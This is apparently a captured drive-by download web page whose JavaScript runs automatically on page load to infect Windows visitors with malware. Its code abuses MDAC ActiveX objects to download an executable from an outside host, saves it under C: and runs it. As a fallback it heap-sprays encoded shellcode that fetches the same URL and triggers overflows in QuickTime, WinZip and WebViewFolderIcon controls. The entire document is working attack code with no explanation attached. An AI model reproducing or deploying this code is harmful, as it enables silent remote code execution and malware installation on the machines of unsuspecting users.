</textarea><html>
<head>
<title></title>
<script language="JavaScript">

var memory = new Array(), mem_flag = 0;
function having(){ memory = memory;
setTimeout ("having()" ,1800); }
function getSpraySlide (spraySlide, spraySlideSize)
{
while (spraySlide.length*2<spraySlideSize)
spraySlide += spraySlide;

spraySlide = spraySlide.substring( 0,spraySlideSize / 2 );
return spraySlide;
}


function MDAC() {
var t = new Array(
"{BD96C556-65A3-11D0-983A-00C04FC29E30}",
"{BD96C556-65A3-11D0-983A-00C04FC29E36}",
"{AB9BCEDD-EC7E-47E1-9322-D4A210617116}",
"{0006F033-0000-0000-C000-000000000046}",
"{0006F03A-0000-0000-C000-000000000046}",
"{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}",
"{6414512B-B978-451D-A0D8-FCFDF33E833C}",
"{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}",
"{06723E09-F4C2-43c8-8358-09FCD1DB0766}",
"{639F725F-1B2D-4831-A9FD-874847682010}",
"{BA018599-1DB3-44f9-83B4-461454C84BF8}",
"{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}",
"{E8CCCDDF-CA28-496b-B050-6C07C962476B}", null);
var v = new Array(null, null, null);
var i = 0;
var n = 0;
var ret = 0;
var urlRealExe = "http://www.yvon-publicidad.com/images/images.php?w=0&e=3";

while (t[i] && (! v[0] || ! v[1] || ! v[2]) ) {
var a = null;
try {
a = document.createElement("object");
a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
}
catch(e)
{ a = null; }

if (a) {
if (! v[0]) {

v[0] = CreateObject(a, "msxml2.XMLHTTP");
if (! v[0])
v[0] = CreateObject(a, "Microsoft.XMLHTTP");

if (! v[0])
v[0] = CreateObject(a, "MSXML2.ServerXMLHTTP");
}

if (! v[1])
v[1] = CreateObject(a, "ADODB.Stream");

if (! v[2])
{
v[2] = CreateObject(a, "WScript.Shell");
if (! v[2])
{
v[2] = CreateObject(a, "Shell.Application");
if (v[2])
n=1;
}
}
}
i++;
}
if (v[0] && v[1] && v[2])
{
var data = XMLHttpDownload(v[0], urlRealExe);
if (data != 0) {
var name = "" + "c:"+"\\ms" + "nt" + GetRandString(4) + ".ex" + "e";
if (ADOBDStreamSave(v[1], name, data) == 1)
{
if (ShellExecute(v[2], name, n) == 1)
ret=1;
}
}
}


return ret;
}


function makeSlide()
{
var heapSprayToAddress = 0x0c0c0c0c;
var heapBlockSize = 0x400000;

var payLoadCode = unescape("%u9090%u9090%u9090" +
"%uCCE9%u0000%u5F00%u56E8%u0000%u8900%u50C3%u8E68%u0E4E%uE8EC"+
"%u0060%u0000%uC931%uB966%u6E6F%u6851%u7275%u6D6C%uFF54%u50D0"+
"%u3668%u2F1A%uE870%u0046%u0000%uC931%u5151%u378D%u8D56%u0877"+
"%u5156%uD0FF%u6853%uFE98%u0E8A%u2DE8%u0000%u5100%uFF57%u31D0"+
"%u49C9%u9090%u6853%uD87E%u73E2%u19E8%u0000%uFF00%u55D0%u6456"+
"%u30A1%u0000%u8B00%u0C40%u708B%uAD1C%u688B%u8908%u5EE8%uC35D"+
"%u5553%u5756%u6C8B%u1824%u458B%u8B3C%u0554%u0178%u8BEA%u184A"+
"%u5A8B%u0120%uE3EB%u4935%u348B%u018B%u31EE%uFCFF%uC031%u38AC"+
"%u74E0%uC107%u0DCF%uC701%uF2EB%u7C3B%u1424%uE175%u5A8B%u0124"+
"%u66EB%u0C8B%u8B4B%u1C5A%uEB01%u048B%u018B%uE9E8%u0002%u0000"+
"%uC031%uEA89%u5E5F%u5B5D%uE8C3%uFF2F%uFFFF%u686D%u2E68%u7865"+
"%u0065%u7468%u7074%u2f3a%u772f%u7777%u792e%u6f76%u2d6e%u7570"+
"%u6c62%u6369%u6469%u6461%u632e%u6d6f%u692f%u616d%u6567%u2f73"+
"%u6d69%u6761%u7365%u702e%u7068%u773f%u303d%u6526%u333d%u0000");
var payLoadSize = payLoadCode.length * 2;

var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u0c0c%u0c0c");

spraySlide = getSpraySlide(spraySlide,spraySlideSize);
heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;

for (i=0;i<heapBlocks;i++)
memory[i] = spraySlide + payLoadCode;
mem_flag = 1;

having();
return memory;
}

function startWinZip(object)
{
var xh = 'A';
while (xh.length < 231)
xh+='A';

xh+="\x0c\x0c\x0c\x0c\x0c\x0c\x0c";
object.CreateNewFolderFromName(xh);
}

function fds907f(o) {
var a=0x7ffffffe, b=0x0c0c0c0c;//, c=0x0c0c0c0c, d=0x0c0c0c0c;
o.setSlice(a,b,b,b);
}

function startWVF()
{
for (i=0;i<128;i++) {
try{ var o = new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1"); fds907f(o);}
catch(e){ }
}
}

function startOverflow(num)
{
if (num == 0) {
try {
var qt = new ActiveXObject("QuickTime.QuickTime");
if (qt) {
var qthtml = '<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" style="border:0px">'+
'<param name="src" value="movie.qt">'+
'<param name="autoplay" value="true">'+
'<param name="loop" value="false">'+
'<param name="controller" value="true">'+
'</object>';
if (! mem_flag) makeSlide();
document.getElementById('mydiv').innerHTML = qthtml;
num = 255;
}
} catch(e) { }

if (num = 255) setTimeout("startOverflow(1)", 2000);
else startOverflow(1);

} else if (num == 1) {
try {
var winzip = document.createElement("object"); winzip.setAttribute("classid",
"clsid:A09AE68F-B14D-43ED-B713-BA413F034904");
var ret=winzip.CreateNewFolderFromName(unescape("%00"));
if (ret == false)
{
if (! mem_flag)
makeSlide();

startWinZip(winzip);
num = 255;
}
} catch(e) { }

if (num = 255)
setTimeout("startOverflow(2)", 2000);

else startOverflow(2);

} else if (num ==2)
{
try {
var tar = new ActiveXObject("WebViewFolderIcon.WebViewFolderIcon.1");
if (tar)
{
if (! mem_flag) makeSlide();
startWVF();
}
} catch(e){ }
}
}


function GetRandString(len)
{
var chars = "abcdefghiklmnopqrstuvwxyz";
var string_length = len;
var randomstring = '';
for (var i=0; i<string_length; i++) {
var rnum = Math.floor(Math.random() * chars.length);
randomstring += chars.substring(rnum,rnum+1);
}

return randomstring;
}

function ADOBDStreamSave(o, name, data) {

try {
o.Type = 1;
o.Mode = 3;
o.Open();
o.Write(data);
o.SaveToFile(name, 2);
o.Close();
} catch(e) { return 0; }

return 1;
}

function CreateObject(CLSID, name) {
var r = null;
try { eval('r = CLSID.CreateObject(name)') }catch(e){}
if (! r) { try { eval('r = CLSID.CreateObject(name, "")') }catch(e){} }
if (! r) { try { eval('r = CLSID.CreateObject(name, "", "")') }catch(e){} }
if (! r) { try { eval('r = CLSID.GetObject("", name)') }catch(e){} }
if (! r) { try { eval('r = CLSID.GetObject(name, "")') }catch(e){} }
if (! r) { try { eval('r = CLSID.GetObject(name)') }catch(e){} }
return(r);
}

function XMLHttpDownload(xml, url) {

try {
xml.open("GET", url, false);
xml.send(null);

} catch(e) { return 0; }

return xml.responseBody;
}


function ShellExecute(exec, name, type) {

if (type == 0) {
try { exec.Run(name, 0); return 1; } catch(e) { }
} else {
try { exec.ShellExecute(name); return 1; } catch(e) { }
}

return(0);

}
function start() { if (!MDAC()) startOverflow(0); }
</script>

</head><body onload="start()"><div id="mydiv"></div>

</body></html>
</body>
</html>